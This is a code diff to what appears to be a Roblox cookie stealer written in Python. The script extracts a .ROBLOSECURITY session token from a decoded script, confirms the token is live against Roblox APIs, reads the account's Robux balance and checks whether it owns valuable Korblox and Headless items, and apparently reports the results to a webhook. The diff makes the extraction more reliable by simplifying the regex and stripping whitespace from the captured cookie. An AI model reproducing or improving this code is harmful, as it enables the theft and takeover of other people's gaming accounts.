@@ -18,27 +18,15 @@ def main():
         if not webhook_url:
             return
 
-        patterns = [
-            r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+)',
-            r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[A-Za-z0-9_\-\.%\|]+)',
-            r'\.ROBLOSECURITY[^=]*=\s*["\']?(_\|WARNING:[^"\'\s;]+)'
-        ]
-        
-        roblosecurity = None
-        for pattern in patterns:
-            match = re.search(pattern, decoded_script)
-            if match:
-                roblosecurity = match.group(1)
-                break
-
-        if not roblosecurity:
-            fallback_match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script)
-            if fallback_match:
-                roblosecurity = fallback_match.group(1)
-
-        if not roblosecurity:
+        # Find the cookie block starting with _|WARNING:
+        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
+        if not match:
             return
 
+        roblosecurity = match.group(1)
+
+        # CRITICAL FIX: Remove all newlines, carriage returns, and extra spaces introduced by formatting
+        roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
         headers = { 
@@ -63,7 +51,6 @@ def main():
             cookie_status = "🟢 Valid & Active"
             color_code = 6528033
 
-            # Fetch Robux
             try:
                 economy_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
                 if economy_res.status_code == 200:
@@ -71,7 +58,6 @@ def main():
             except Exception:
                 pass
 
-            # Check Korblox (Asset ID: 13961116) & Headless (Asset ID: 134082579)
             try:
                 korblox_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers=headers)
                 if korblox_res.status_code == 200 and len(korblox_res.json().get("data", [])) > 0:
